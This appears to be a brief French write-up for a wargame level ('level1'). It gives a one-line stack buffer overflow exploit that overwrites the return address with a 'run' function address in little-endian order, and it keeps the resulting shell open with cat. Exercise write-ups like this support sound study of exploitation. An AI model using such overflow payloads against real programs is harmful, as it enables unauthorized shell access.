command:
(python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1

08 04 84 44 = adresse de la fonction run
little endian donc on inverse le sens de l'adresse ce qui nous donne:
44 84 04 08

le cat a la fin permet de garder le shell ouvert
